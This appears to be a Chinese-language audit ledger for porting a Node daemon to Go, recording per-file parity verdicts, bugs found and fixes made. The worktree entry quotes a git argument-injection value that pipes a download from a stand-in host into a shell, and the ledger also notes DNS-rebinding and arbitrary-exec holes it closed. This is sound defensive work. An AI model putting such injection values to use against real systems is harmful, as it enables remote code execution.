# Node → Go 逐文件审计台账

对应 Issue：`2026-10-20-o-line-by-line-node-audit.md`

结论口径：`PORTED`（有等价实现）/ `PARTIAL`（有但缺分支）/ `MISSING`（没有）/ `DROPPED`（决定不做）/ `N/A`（无运行时行为）。
每条都写证据位置，不带证据的结论视为未审计。

---

## 批次 1 · `archive/packages/server/src/server/` 顶层（76 文件）

### 已审计

| 文件                                 | 行数 | 结论               | 证据 / 缺口                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| ------------------------------------ | ---- | ------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `service-proxy.ts`                   | 1039 | **MISSING**        | Go 无 HTTP/WS 反代。需要：脚本端口注册表、`<script>--<workspace>.<baseDomain>` 主机名路由、本地/公网 URL 投影、health 探测。`internal/relay` 只有 E2EE 中继，不是这个。                                                                                                                                                                                                                                                                                                                                                                     |
| `script-health-monitor.ts`           | 229  | **MISSING**        | 依赖 service-proxy，用于探测脚本存活并回调。Go 无对应。                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| `workspace-service-port-registry.ts` | —    | **MISSING**        | 脚本端口分配/回收。`workspace.script.start` 现在直接跑命令，不分配端口。                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| `workspace-setup-runtime.ts`         | —    | **PARTIAL**        | Go 有 `internal/server/ws_plugin_setup.go` 跑 `byspace.json` 的 setup，但缺：阶段划分、`blocked` 状态与 `blockedSource`、change-request 门禁。**change-request 门禁与 `blockedSource` 已补**：门禁阻止 setup/scripts 并把来源（forge/number/headRepository）随进度发出，否则 banner 只能显示「blocked」而说不出被谁挡的、该做什么。`blockedSource` 是 optional 不是 nullable，没门禁时必须省略该键——发 null 会让校验失败、客户端完全不显示 banner。仍缺阶段划分（`running` 内部细分）。                                                     |
| `daemon-config-store.ts`             | 1199 | **PARTIAL**        | Go `store.LoadDaemonConfig/SaveDaemonConfig` 读写嵌套 `{version,daemon:{...}}`；缺 `agentProfiles` 增删改查、`providers` 的 profiled 配置校验、迁移路径。**配置写入校验已补**（`internal/store/config_validation.go`）：agentProfiles 要求 name、拒重复（重复 id 会静默遮蔽前一个）；providers 必须有一项 command/extends/baseUrl，否则无法启动；network.tcpPort 与 allowLanAccess 类型检查；relay.endpoint 必须带端口（裸主机名会静默连不上）。未知键**故意允许**——本 build 不知道新客户端可能发的字段，拒绝它等于拒绝 UI 自己产出的配置。 |
| `session.ts`                         | 7773 | **PARTIAL**        | 158 个消息 case 全部路由（协议 171 条入站全覆盖），但深度不一。详见下方「session.ts 逐 case」。                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| `websocket-server.ts`                | 2771 | **PARTIAL** → 已补 | 连接生命周期。审计发现并修复：hello 超时（Node 15s/4001，Go 原本没有，半开连接会永久占坑）、shutdown 广播（Node 发 1001，Go 没有，重启时客户端只看到静默断开）、close code 数值对齐（Go 用 4400/4402，Node 用 4003/4002）。仍缺：外部会话 90s 宽限期重连（`externalSessionsByKey`）、运行指标 30s 刷写。                                                                                                                                                                                                                                    |

### session.ts 已确认的实现缺口

| Case                          | Node 行为                              | Go 现状                                                     |
| ----------------------------- | -------------------------------------- | ----------------------------------------------------------- |
| `workspace.script.start/stop` | 分配端口、注册 proxy 路由、健康探测    | 直接 `/bin/sh -lc` 跑命令，无端口/proxy（见 service-proxy） |
| `workspace.setup.run`         | 阶段化执行 + blocked 判定              | 逐条执行 + 日志，无 blocked                                 |
| `agent.skills.*`              | SHA-256 比对 + 事务写入 + 回滚         | 只读扫描 + 三态判断，无 add/update/delete                   |
| `agent.rewind`                | 文件快照回滚（conversation/code/both） | 返回 `ok:true` 占位                                         |
| `provider.usage.list`         | 8 家厂商真实抓取                       | 返回空数组                                                  |
| `hub.*`                       | Hub 远控                               | `not_connected` 占位                                        |

| `workspace-git-service.ts` | 3601 | **PARTIAL** → 已补推送 | Go 有 `internal/workspace/git.go` 的读侧（status/diff/commits/forge）与 `runtime_services.go` 的文件+diff 订阅，但**从不广播 `workspace_update` / `checkout_status_update`**。前端 `workspace-directory-reconciliation.ts` 与 `session-context.tsx` 都在监听这两个消息，收不到就只在全量拉取时才更新。已补：工作区增/改/归档、worktree 创建、git 状态变化时主动推送。仍缺：观察目标的重连自愈相位、LRU 缓存层、并发限流。 |

### 工具盲区（本轮发现并修掉）

`go-emit-parity.mjs` 对 `payload: z.discriminatedUnion(...)` 的消息标为 opaque 后**整条跳过**，
于是 `workspace_update` 这种「payload 是联合体」的消息即使从未发送也不会被报出来。
已改为：opaque 只跳过**字段**比对，仍然检查**是否发送过**。补上后立刻暴露 4 条 NEVER_SENT。

同时修掉解析器的两个盲区：

- 标识符参数（`sendSessionMsg(..., respType, ...)`）被 `slice(1,-1)` 切成 `espTy`，导致所有 `respType` 派生的响应都识别不到
- 同一分支内 `if` 二次赋值 `respType` 时只认第一个（`github_search_response` 被误报）；顺手把该处代码改成两个显式调用，静态可见

| `bootstrap.ts` | 1883 | **PARTIAL** → 已补 | 启动流程。已补：`BYSPACE_LISTEN` 支持 unix socket / named pipe（Node 支持 6 种形式，Go 只做 TCP）、启动时清理废弃的 `agent-timelines` 目录。仍缺：managed helper process 台账对账（`reapStale`）、启动时 skills 维护、`terminalProfiles`/`agentProfiles` 从启动参数注入、trustedProxies。 |

| `worktree-bootstrap.ts` | 1101 | **PARTIAL** → 已补核心 | **创建工作区/worktree 后从不跑 setup**——`setupTerminalId` 恒为 nil，`byspace.json` 的 setup 命令在新 worktree 里永远不执行，导致「新建的 worktree 看起来就绪，但第一条命令就失败」。已补：`workspace.create` 与 `create_byspace_worktree` 都异步启动 setup 并流式上报进度；无 setup 命令时在 `setupSkippedReason` 里说明。测试 `TestWorkspaceCreateRunsSetup` / `TestWorkspaceCreateReportsSkippedSetup`。仍缺：`runtimeEnv` 解析（worktree 专属环境变量注入终端）、失败时清理、`runWorktreeAutoTerminals`、脚本生命周期的 port/proxy 部分。 |
| `worktree-session.ts` | 929 | **PARTIAL** | worktree 会话级操作大多走 `internal/workspace/git.go`；缺自动终端与脚本 teardown。 |

| `workspace-archive-service.ts` | 643 | **PARTIAL** → 已补核心 | **归档工作区时不停它的 agent、不关它的终端**——只把工作区记录的 `archivedAt` 翻了一下。归档掉的 agent 仍在跑并继续消耗 token，PTY 也一直占着。已补 `archiveWorkspaceContents`：关闭该工作区的全部 agent 运行时、杀掉其终端、归档 agent 记录并广播。测试 `TestArchiveWorkspaceStopsItsAgents`（已验证移除修复即失败）。仍缺：按引用计数判断目录是否可删（`isDirectoryUnreferenced`）、`archiveByScope` 的批量语义。 |

| `agent-history-search.ts` | 188 | **MISSING** → 已补 | 历史搜索是**分词 + 六级 tier + 字段优先级**的相关性排序（workspace > title > branch > project，每 token 必须命中，可跨字段）。Go 只有「标题/cwd/ID 子串包含」——多词查询搜不到、无相关性排序、无法与多主机分页结果合并。已按 Node 重写：`internal/server/history_search.go` + `match.TokenizeQuery`，`filterAndSortAgents` 改为走它。4 个测试覆盖跨字段、排序、容错、空查询。 |
| `resolve-workspace-id-for-path.ts` | 46 | **MISSING** → 已补 | 按路径解析工作区：精确匹配优先，否则**最深**的包含工作区，且**永不匹配 home 目录**（否则吞掉所有路径）。Go 只有精确字符串比较，传 worktree 子目录时找不到。已补 `store.ResolveWorkspaceIDForPath` + 5 个断言。 |
| `persisted-config.ts` | 521 | **PARTIAL** | Go 读写 `{version,daemon:{...}}` 结构已对齐；缺 schema 校验与迁移路径。 |

| `checkout-diff-manager.ts` | 413 | **MISSING** → 已补 | **文件订阅与 diff 订阅的轮询从未启动**：`PollSubscriptionsOnce` 只有测试里手动调用过，`New()` 里没有任何 goroutine 驱动它。于是「编辑器里订阅了文件」和「diff 面板订阅了变更」在真实运行中**永远收不到推送**。已补 `startSubscriptionPoller`（1s 周期），`Close()` 时停止。测试 `TestFileSubscriptionFiresWithoutManualPoll`（已验证移除轮询即失败）。差异：Node 用文件系统 watcher + 150ms 防抖，Go 用 1s 轮询——更省依赖，延迟略高。 |

| `workspace-script-runtime-store.ts` | — | **MISSING** → 已修字段 | 脚本 payload 的**字段名全错**：协议要 `scriptName`/`type`/`hostname`/`port`/`lifecycle`(running\|stopped)/`health`，Go 发的是 `name`/`command`/`status`。整个 `workspace.script.start.response` 与 `script_status_update` 客户端校验失败，脚本面板什么都不显示。已按 schema 重写并加测试。仍缺：端口分配与 proxy 路由（见 service-proxy）。 |
| `daemon-config-store.ts` | 1199 | **PORTED** | `agentProfiles` 经 `set_daemon_config` 透传即可；前端选择器把 profile 展开成具体 provider/model/mode，daemon 只存不解释。 |

| `pid-lock.ts` | 364 | **PARTIAL** → 已补 | Node 的锁是 JSON（pid/startedAt/hostname/uid/listen/heartbeat）+ 30s 心跳 + **5 分钟陈旧回收**。Go 只写裸 PID：崩溃后 pid 被无关进程复用时，`IsStale` 无从判断，锁会一直挡住重启。已补 `PIDLockInfo`/`ReadPIDLock`/`IsStale`/`TouchPIDLock`，`serve` 启动时检查并拒绝重复实例，30s 心跳；旧格式（裸整数）仍可读。4 个测试覆盖往返、旧格式、死 pid、过期心跳。 |

| `config.ts` | 812 | **PARTIAL** → 已补安全项 | Node 支持 30 个环境变量，Go 缺关键几个。已补：**Host 白名单**（`BYSPACE_HOSTNAMES`/`BYSPACE_ALLOWED_HOSTS` + `config.daemon.hostnames`），挡 DNS rebinding —— 绑定 loopback 的 daemon 仍可被 `evil.example` 解析到 127.0.0.1 后访问，Host 头是唯一信号。实测伪造 Host 返回 403，`127.0.0.1`/`localhost`/机器名正常。仍缺：`BYSPACE_PASSWORD` 密码鉴权、`BYSPACE_TRUSTED_PROXIES`、git 并发限流、`BYSPACE_LOG_*` 日志级别、relay TLS 覆盖。 |
| `home-workspace.ts` | 391 | **PARTIAL** → 已补 | Node **每次启动都重新断言** Home 的展示属性；Go 发现已存在就 `return nil`。label 一旦丢失（手改、旧版本、合并出错），Chief 就不再置顶、还多出 `+` 按钮。已补：按 cwd 重新打标而非新建重复记录，用户自设标题保留。2 个测试。 |
| `web-ui.ts` | 271 | **PORTED** | gzip/br 内容协商、SPA 回退、连接提示注入、缓存头均已对齐。 |
| `tunnel-manager.ts` | 567 | **MISSING** | 完整 TCP 端口转发子系统（每端口一个 listener + relay 流复用 + 断连宽限）。Go 的 `tunnel.*` 只是 `not_connected` 占位。**暂不实现**：验证需要两台机器，owner 明确说当前不具备条件，盲写风险高于收益。 |

| `relay-transport.ts` | 554 | **PARTIAL** → 已补 | 缺两件事：**keepalive**（Node 每 10s ping，30s 无应答即判定 half-open 并强制重连——否则中继悄悄消失时 `Read` 永不返回、`Close` 永不到达，daemon 以为自己还连着而手机一直超时）、**退避**（Node 线性退避到 30s，Go 固定 2s 会一直捶一个挂掉的中继）。均已补。 |
| `workspace-registry.ts` | 714 | **PORTED** | 记录投影与命名规则（title 优先、否则 displayName）已在 `buildWorkspaceDescriptor` 与 `buildProjectDescriptor` 对齐。 |
| `workspace-directory.ts` | 721 | **PARTIAL** → 已补 | `resolveWorkspaceRootAgent` 缺失：子代理会话应归组到发起对话的根 agent，跨工作区时停在边界，遇环返回 nil。已补 `internal/server/agent_tree.go` + 4 测试。同时修正 parent 关系的存储位置——共享词表用 label `byspace.parent-agent-id`，Go 原本存在私有字段里。 |

| `ws_git_system.go` / `pi/rewind` | — | **MISSING** → 已补 | `agent.rewind` 之前只是把内存 timeline 截断：provider 完全不知道，下次水合就把旧分支恢复回来。已按 Node 实现：生成 pi 集成扩展（`internal/agent/pi/extension.go`，移植自 `createPiBySpaceExtensionFile`），提供 entry capture（把用户消息映射到 pi 的树条目 id）与 tree navigation（`byspace_tree` 命令调用 `ctx.navigateTree`）。`agent.rewind.request` 现在走真实 provider 导航，失败会返回错误而不是假成功。 |
| `server.go` listen | — | **MISSING** → 已补 | daemon 只绑一个 loopback 族：前端把 `127.0.0.1` 归一成 `localhost` 后浏览器可能解析到 `::1`，连接超时并表现为「未连接主机」。已补双栈绑定（`listen_dual.go`），`127.0.0.1`/`localhost`/`[::1]` 三种地址实测均可连。 |
| `hostnames.ts` | — | **已修正实现** | 我最初把 Host 白名单加在 `ServeHTTP` 上，拦掉了静态资源和 API，导致整个前端「未连接」。Node 只在 **WebSocket 升级**时校验（`websocket-server.ts:737`），并且未配置白名单时默认不限制。已改到 `handleDirectWS`，默认放行。 |

| `daemon-config-store.ts` | 1199 | **PARTIAL** → 已补核心 | `daemon.config.reload` 之前返回三个空数组：settings 页无法区分「已生效」「需要重启」「环境变量接管，你的修改被忽略」。已补 `config_reload.go`（移植 RELOADABLE_PATHS 25 条 + 环境变量归属表 + 前缀匹配 + JSON 值比较），并真的清掉 CORS / hostnames 缓存。端到端验证：改 `appendSystemPrompt` 后正确归入 `appliedPaths`。仍缺：brcf 密码哈希写入、provider 增删的事务回滚、`onFieldChange` 热应用（relay 重连、tunnel 重配）。 |

| `worktree-session.ts` | 929 | **PARTIAL** → 已补安全项 | `normalizeGitOptions` 的取值逻辑（worktreeName → gitOptions 的推导、slug 归一）Go 已在 handler 里做，但 **`assertSafeGitRef` 完全缺失**。`CreateWorktree` / `SwitchBranch` / `RenameBranch` / `Merge` 都把客户端字符串直接拼进 git 参数；git 会把 `-` 开头的值当选项，`--upload-pack=curl evil\|sh` 在 fetch 时就执行。已补 `AssertSafeGitRef`（字符集 + 首字符 + `..`/`@{`）与 `AssertSafeWorktreeSlug`（路径穿越），4 个测试覆盖注入与穿越，真实 worktree 创建仍正常。仍缺：`createBySpaceWorktreeWorkflow` 的 pr-number→checkoutSource 兼容层、`runWorktreeSetupInBackground` 的 runtimeEnv 注入。 |

| `workspace-reconciliation-service.ts` | 542 | **MISSING** → 已补 | 没有任何「定时从磁盘重新读取 git 事实」的机制：在终端里切分支后侧边栏一直显示旧分支，一个原本是普通目录的工作区后来变成 git 仓库也永远还是 `directory`。已补 `workspace_placement.go`（移植 `reconcileWorkspacePlacement`，只改真正变化的字段；已稳定的记录不重复写，避免每 5 分钟把 `updatedAt` 刷一遍并广播一堆无意义 update），并挂到 5 分钟定时器上（对应 Node 的 `DEFAULT_RESCAN_INTERVAL_MS`）。 |

| `agent/agent-loading.ts` | 148 | **PARTIAL** → 已补 | 三个缺陷：① **并发冷启动不去重**——两个请求同时到达都看到「未加载」，各起一个 provider 进程，输的那个变成孤儿并继续占着会话文件；② **不检查归档状态**——归档的 agent 仍可被 resume，等于复活用户已经删掉的会话并继续烧 token；③ **不校验 provider 是否已注册**——记录指向本构建不认识的 provider 时，报的是 exec 失败而不是「你缺少这个 provider」。均已补，3 个测试；去重测试已验证移除修复即失败（`concurrent loads produced more than one session`）。 |

| `agent/agent-projections.ts` | 521 | **PARTIAL** → 已补 | `toAgentPayload` 有 `runtimeInfo` 与 `lastError`，Go 都没发。前者是 provider 实际使用的模型（可能被压制成支持的档位，与配置不同），composer 用它显示实时选择；后者是 agent 页的 `lastHostError`，缺了只会显示泛化的「出错了」。补的时候踩了一次：两者在 schema 里是 **optional 而非 nullable**，发 `null` 会让整个 `fetch_agents_response` 校验失败——已改成有值才加。 |

### 审计工具补了一项：optional 字段禁止发 null

`go-emit-parity.mjs` 只查「发没发」，不查「发的是不是 null」。而 protocol 里的功能字段大多是
`optional` 而非 `nullable`，发 `null` 会让**整条响应**失效——比不发更糟，前端拿到的是零数据。
这类错误我犯过两次（`projectIconRevision`、`runtimeInfo`），都是提交后才在浏览器里发现。

新增 `NULLED_OPTIONAL` 检查，首跑就抓出 7 处：`tunnel.*.error`、`create_byspace_worktree_response`
的 `errorCode`/`setupSkippedReason`、`providers_snapshot_update.cwd`、
`hub.management.daemon.disconnect.response.warning`。全部改为「有值才添加」，并新增
`CONDITIONALLY_OMITTED` 显式记录哪些字段是条件省略（每条写明条件），避免检查器把合法省略当成漏发。

同时修了它自己的两个盲区：成员集合为空时整个审计会静默通过（现在退化为扫「所有带 type 字面量的
schema」）；`payloadText` 只截到分号，导致嵌套 key 的 null 检查失效。

接入 CI（`Validate CI contracts`）并补 3 个测试。

### 入站字段缺口：从 47 清到 42（本轮）

`terminal_input` 是**真正的功能缺陷**：协议形状是 `{terminalId, message: {type, data}}`，
Go 读的是顶层 `data`，于是 JSON 路径的按键、resize、鼠标事件全部静默丢弃（打字之所以还能用，
是因为客户端优先走二进制帧）。已按协议解析 `input`/`resize`/`mouse`，并保留扁平 `data`
作为旧 bundle 的兼容。端到端验证：发嵌套 `{type:"input", data:"echo NESTED_OK\r"}` 后
`capture_terminal` 能读到 `NESTED_OK`。

`terminal.rename.request` 完全没有解析请求体，返回成功但标题不变——已补。

`fetch_agent_timeline_request.limit` 被忽略，翻页客户端每次都拿整段历史——已按窗口截断。

`create_terminal_request.agentId` 未解析，开终端时回落到 daemon 的 cwd 而不是该 agent 的工作目录
——已补（优先 agent.cwd，其次 workspace.cwd）。

### 入站字段名不一致：4 处功能直接失效

协议字段名和我写的 struct tag 不一样时，`json.Unmarshal` 不报错、字段为空，功能静默不生效。
本轮抓到的：

| 消息                                | 我写的    | 协议          | 后果                                       |
| ----------------------------------- | --------- | ------------- | ------------------------------------------ |
| `checkout.rename_branch.request`    | `newName` | `branch`      | 重命名成空字符串，必然失败                 |
| `stash_save_request`                | `message` | `branch`      | stash 没有标签，还原时无法识别             |
| `checkout_pr_create_request`        | `base`    | `baseRef`     | PR 总是打到仓库默认分支                    |
| `checkout.*.set_auto_merge.request` | 未解析    | `mergeMethod` | 硬编码 `--merge`，squash-only 仓库必然被拒 |

另外两处更严重：

- **`open_in_editor_request` 直接 `exec.Command(req.EditorID)`** —— `editorId` 来自客户端，
  等于把任意字符串当命令执行。改为白名单 + `LookPath` 校验，列表接口用同一份白名单。
- `terminal_input` 的嵌套形状（见上一条）。

### 入站缺口 34 → 32：写配置的乐观锁 + 工作区列表的筛选排序分页

- **`write_project_config_request.expectedRevision` 被忽略**：编辑器持有的 revision 没有比对，
  两个打开的编辑器会互相覆盖、静默丢改动。已按协议实现：不匹配返回
  `{code: "stale_project_config", currentRevision}`（`ProjectConfigRpcErrorSchema` 是
  discriminated union，不能自己造 `errorCode`），失败分支也只允许 `{requestId, repoRoot, ok, error}`。
  端到端验证：错误 revision 被拒且响应通过协议校验。
- **`fetch_workspaces_request` 的 filter/sort/page 全被忽略**：侧边栏搜索框无效、排序不生效、
  大列表一次全量下发。已实现 `filterSortPageWorkspaces`（query 匹配名称/分支/项目名、
  projectId 过滤、4 种排序键含 `status_priority`、cursor 分页），4 个测试。

### 终端订阅泄漏（真 bug）

`Session.Subscribe` 返回 `unsubscribe` 函数，Go 侧两处调用都把它丢掉了；`unsubscribe_terminal_request`
的 handler 直接 `return`。后果：

- 对同一 terminal 重复 subscribe（重连时很常见）会让输出推送**成倍放大**
- 关闭的 socket 仍然持续收到二进制帧
- 客户端主动取消订阅完全无效

已补 per-sink 订阅表（`terminalUnsubscribers`），支持按 terminal 取消与整个 socket 拆除时清理，
两个测试；端到端验证「订阅两次 → 取消 → 不再收帧」。

### `terminal/**`：shell 检测、输出合并、尺寸归属

| 文件                           | 结论               | 说明                                                                                                                                                                                                                                                                   |
| ------------------------------ | ------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `shell-detect.ts`              | **MISSING** → 已补 | Go 只返回 `$SHELL` 一项，选择器看起来「只装了一个 shell」。已移植完整发现顺序（env → macOS 登录 shell → `/etc/shells` → 常见路径），只返回存在的。本机实测 **7 个**（zsh/bash/csh/dash/ksh/sh/tcsh）。PTY 也改用同一解析，避免「Auto 显示的」与「实际 spawn 的」漂移。 |
| `terminal-output-coalescer.ts` | **MISSING** → 已补 | 每次 PTY read 都发一帧；大量小写入的命令（构建日志、`yes`）让客户端把时间花在帧开销上。已加前导沿 + 5ms 窗口，交互回显仍是立即的。实测 1647 字节 / 13 帧，无丢字节。                                                                                                   |
| `terminal-size-ownership.ts`   | **MISSING** → 已补 | 两个客户端看同一终端时，后 resize 的赢：手机上打开会话会把桌面 shell 压成手机宽度、整段换行错乱。已按 claim/update 语义实现归属，缺省 intent 视为 claim（老客户端行为）。                                                                                              |

| `terminal-restore.ts` | **MISSING** → 已补 | `subscribe_terminal_request.restore` 的三种模式完全没处理，每次重连都同时发快照 + 全量重放。已实现 `planTerminalRestore`：`live` 只重放字节（最省）、`visible-snapshot` 限定 scrollback 行数（默认 200，上限 1000）、`full-snapshot` 全量。并给 VTGrid 加了 `SnapshotWithScrollback`。 |

| `agent/agent-manager.ts` | 5496 | **PARTIAL** → 已补两处 | ① **归档父 agent 不级联**：`cascadeArchiveChildren` 缺失，归档一个会话后它派生的子 agent 继续跑、继续烧 token。已实现，含 `shouldDetachFromArchivedParent` 语义——跨工作区的、或用户已打开 tab 的子 agent 应**脱离父级**而不是被归档（归档等于删掉用户还在看的东西）。② **关闭时不取消等待者**：`prepareAgentForClosure` 会给所有 waiter 发 `turn_canceled`，Go 没有，导致 `wait_for_finish` / `byspace wait` 在 agent 已消失后仍挂到自己的超时。已补：`Session.Close` 唤醒所有 waiter，归档路径广播 `turn_canceled`。3 个测试。 |

| `services/quota-fetcher/**` | 4221 | **PARTIAL** → 框架 + 2 家 | `provider.usage.list` 之前硬编码返回空数组，Usage 页看起来是「你没有额度」而不是「这个构建读不到」。已建 `internal/quota`（统一 `Usage`/`Window`/`Balance` 形状、15s 超时、body 上限、tone 阈值），并实现 **codex**（读 `~/.codex/auth.json`，只读不刷新——刷新归 CLI 管，两个 daemon 轮换同一 token 会把用户登出）与 **zai**（`ZAI_API_KEY`/`GLM_API_KEY`）。缺失凭据时返回 `unavailable` 而不是 `error`，两种情况对用户意味着不同的事。6 个测试 + 端到端验证响应通过协议校验。**仍缺 6 家**：claude（keychain，480 行）、cursor、copilot、grok、kimi、minimax——未移植，需真实凭据才能验证。 |

| `agent/agent-prompt.ts` + `agent-timeline-content.ts` | 571 + 85 | **MISSING** → 已补 | ① **系统信封完全没实现**：BySpace 自己注入的 prompt（chat mention、定时触发、完成通知）以 `<byspace-system>…</byspace-system>` 包裹，provider 收到的是普通用户消息，但**不是人说的话**。Go 直接把它们当用户气泡渲染，等于让 transcript 谎报是谁提的需求。已实现 `FormatSystemNotificationPrompt` / `IsSystemInjectedEnvelope`（锚定 + 要求精确换行布局，用户手打标签不会被隐藏），并在 pi 历史重放处过滤。② **timeline 内容无上限**：`limitAgentTimelineItemContent` 缺失，一次 `cat` 大文件或失败构建的输出会随每一行、每次拉取、每次落盘重复传输。已实现 64KB 上限（保留前缀，命令本身不动）。6 个测试。 |

| `agent/agent-run-state.ts` | 313 | **PARTIAL** → 已补键点 | Node 用 run token 让**过期的 settle 事件失效**。Go 直接按 `turnId` 改状态：第二轮 prompt 发出后，第一轮的 `byspace_turn_completed` 若还没处理完，会把新轮次翻成 idle，UI 上「进行中」提前消失。已补 `Session.turnToken`（每轮新铸）与完成事件上的 token 比对，不匹配则丢弃。`ManagedSession` 接口加了 `TurnToken()`，其余 provider 返回空串（回落到 turnId 比较）。 |

| `auth.ts` | 162 | **MISSING** → 已补 | **密码鉴权完全没实现**：配置里能设 `auth.passwordHash`，但 daemon 对所有请求一律放行；`passwordSet` 还硬编码成 false。这意味着设了密码的用户以为有保护，实际任何能连 loopback（或经 relay/tunnel 连进来）的东西都能操作 daemon。已实现 bcrypt(12) 哈希、`Authorization: Bearer`、WebSocket 的 `byspace.bearer.<token>` 子协议、豁免路由表（`/api/health`、`/api/files/download`、`/mcp/agents`）、`/mcp/agents` 的 capability-token 自鉴权、`passwordSet` 由 hash 派生而非存储。端到端验证：无密码 200、有密码无 token 401、错 token 401、对 token 200、health 免鉴权 200、**改配置无需重启即生效**。 |

| `byspace-env.ts` | 92 | **MISSING** → 已补 | `RUNTIME_CONTROL_ENV_KEYS` 的剥离完全没实现。其中 `BYSPACE_PI_TERMINAL_HOOK_OWNER_PID` 是项目记忆里记过的真实故障源：Pi 扩展读到不属于自己的 pid 就认为自己是继承来的子进程，**一个 handler 都不注册**，终端从此永远不上报 running/idle。已实现 `home.ExternalProcessEnv`（overlay 之后再剥离，调用点无法把它塞回来），接到 PTY、agent JSONL 进程、setup 脚本三处 spawn 点。端到端验证：daemon 自身带 `BYSPACE_PI_TERMINAL_HOOK_OWNER_PID=4242` 启动，从它开的终端里 `echo` 出来是空的。4 个测试。 |

| `runtime-mcp-config.ts`（内联在 `providers/pi/agent.ts`） | ~60 | **MISSING** → 已补 | **内置 MCP 桥从未注入**：`byspace mcp-bridge`、`/mcp/agents` 和它背后 37 个工具都实现了，但没有任何东西把它们接到 agent 上——pi 没有 MCP 启动参数，只能通过扩展的 `pi.registerMcpServer` 注册。已在生成的扩展里注入（内置桥自举 `os.Executable()` + 用户配置的 server），并补了 daemon 侧的系统提示注入（`before_agent_start`）。`/mcp/agents` 现在用 per-run capability token 自鉴权。 |

| `resolve-worktree-creation-intent.ts` | 279 | **MISSING** → 已补 | `create_byspace_worktree_request` 的 `action` 与 `checkoutSource` 完全没解析，`refName` 被无条件当作「新分支的起点」，于是「检出已有分支」和「检出这个 PR」都变成了「从它开新分支」——分支名对，工作树内容错。已实现 `ResolveWorktreeIntent`（6 种组合 + 两个具名错误）、`ResolveChangeRequestCheckoutTarget`（gh/glab/tea 三家分别解析 head/base/cross-repo）、`checkoutExistingBranch`、`checkoutChangeRequest`（用 `refs/pull/<n>/head`，跨仓库 PR 也能检出）、`ResolveDefaultBranch`。端到端验证三条路径：branch-off 建 `feat-new`、checkout 检出 `existing-branch`、缺目标返回 `invalid_worktree_intent`。 |

| `worktree-branch-name-generator.ts` | 145 | **MISSING** → 已补 | 没有 slug 时工作区叫 `wt-mabc123`／分支叫 `wt-mabc123`——用户在侧边栏和 `git branch` 里看到这个名字直到任务结束。已实现 `internal/naming`：用短生命周期的 `pi --no-session` 生成标题与分支名（**不用 agent 自己的会话**，否则会往用户正在读的 transcript 里插一轮），返回后做归一化（小写、只留 `[a-z0-9-]`、压缩连字符、100 字符上限、禁止 `-` 开头——模型输出是不可信输入且要进 git 参数）。端到端：中文 prompt「修复登录页在 Safari 上的自动填充失效问题」→ 分支 `fix-safari-login-autofill`。命名失败**不阻断**创建工作区，回落到生成式 slug。4 个测试。 |
| `workspace-auto-name.ts` | 141 | **PARTIAL** | 自动命名已在创建路径上生效（标题 + slug）；仍缺「创建后再命名」与 currentSelection 透传——后者只影响用哪个模型生成，已在 `metadataGeneration.model` 读取。 |

| `workspace-service-env.ts` | 121 | **PARTIAL** → 已补端口部分 | 我原来只注入了 `PORT` / `WORKSPACE_SCRIPT_PORT`。Node 还给脚本一整组互相发现用的变量：`HOST`（按 daemon 绑定地址推导，loopback 就只给 127.0.0.1）、`BYSPACE_PORT`、以及每个兄弟脚本的 `BYSPACE_SERVICE_<NAME>_PORT`。没有这组，一个前端 dev server 无法知道自己后端拿到哪个端口——多工作区并行时必然撞车。已实现（含 env 名归一化与**冲突检测**：`web app` 和 `web-app` 都会变成 `WEB_APP`，两个脚本会互相覆盖）。端到端：`api` 得 60548，`web` 得 60549 且 `BYSPACE_SERVICE_API_PORT=60548`。`BYSPACE_URL` / `..._URL` 仍缺——它们属于未实现的反向代理，发一个指向不存在路由的 URL 比不发更糟。 |

| `project-directory-service.ts` | 215 | **PARTIAL** → 已补 | 三个差异：① 用 `MkdirAll`，`parentPath` 打错一个字就把整条父目录链建出来，而不是报 `parent_directory_not_found`；② 名称校验弱（只查空和路径分隔符），绝对路径、盘符、`..` 都能过；③ 注册失败后**留下的空目录不清理**，却告诉用户失败了。已补 Node 的 `validateDirectoryName` 规则、父目录存在性检查、`permission_denied` 错误码、注册失败回滚。端到端四条路径验证（父不存在 / 绝对路径 / 路径穿越 / 正常），无残留目录。 |
| `logger.ts` | 197 | **PARTIAL（不构成静默失败）** | Node 有完整的日志子系统（级别、格式、文件路径解析、`authorization`/`sec-websocket-protocol` 脱敏）。Go 没有结构化日志，`daemon.log` 只是 `daemon start` 的 stdout/stderr 重定向。**没有引入脱敏是因为没有任何地方记录请求头**——先造一套脱敏机制来防一个不存在的泄漏，等于为了对齐而发明。若将来加请求日志，脱敏必须同时加，`diagnostics` 端点会读这个文件。 |

| `workspace-git-fetch.ts` | 140 | **MISSING** → 已补 | fetch 前后对比 ref 快照，判断远端分支是新增/移动/删除。没有它，pull 后被 prune 的分支仍留在前端的选择器里。已实现 `ReadRefs`/`DiffRefs`/`FetchRemote`（本地 ref 变化单独报告，不与「远端分支变了」混为一谈），接入 `checkout_pull_request`。**顺带修了一个更大的问题**：`runGit` 对所有命令统一 5 秒超时，`git pull`/`fetch` 在真实网络下必然超时并报成 context deadline；现在网络动词 120 秒、本地 10 秒，并强制 `GIT_TERMINAL_PROMPT=0`（否则需要凭据的 fetch 会一直等人回答 prompt）。真实 clone + 上游建分支验证：`origin/<branch>` 被正确报为 added。 |
| `workspace-service-port-allocator.ts` | 129 | **PARTIAL** → 已补 | 只有「任意空闲端口」一种策略。另两种各有非用不可的理由：`portRange` 因为防火墙规则/容器端口映射只允许一个窗口，`portScript` 因为外部服务已经对外声明了端口。已实现 `ParsePortRange`、`AllocateFromRange`（窗口耗尽时报错而不是逃出窗口）、`AllocatePortFromScript`（输出不可信、要进 bind，做了长度与范围校验）。端到端：portRange 得 43000、portScript 得 43500，两个值都真的进了脚本环境。 |

